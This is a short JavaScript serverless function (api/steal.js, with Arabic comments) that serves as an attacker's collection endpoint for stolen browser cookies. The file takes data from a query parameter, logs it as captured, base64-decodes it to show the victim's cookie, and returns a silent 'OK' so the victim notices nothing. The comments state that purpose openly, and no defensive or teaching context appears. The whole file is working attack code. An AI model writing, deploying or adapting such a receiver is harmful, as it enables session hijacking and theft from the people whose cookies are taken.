// الملف: api/steal.js

export default function handler(request, response) {
  // 1. احصل على البيانات المسروقة من الرابط (من المعلمة 'c')
  const stolenData = request.query.c;

  // 2. اطبع البيانات في سجلات Vercel (هذا هو صندوق البريد الخاص بنا)
  console.log('---------------------------------');
  console.log('>>> DATA CAPTURED <<<');
  console.log('Timestamp:', new Date().toUTCString());
  console.log('Raw Data:', stolenData);
  
  // 3. (اختياري) فك تشفير البيانات لرؤية الكوكيز بشكل واضح
  try {
    const decodedData = atob(stolenData);
    console.log('Decoded Cookie:', decodedData);
  } catch (e) {
    console.log('Could not decode data.');
  }
  
  console.log('---------------------------------');

  // 4. أرسل استجابة فارغة وناجحة للضحية لكي لا يلاحظ شيئًا
  response.status(200).send('OK');
}
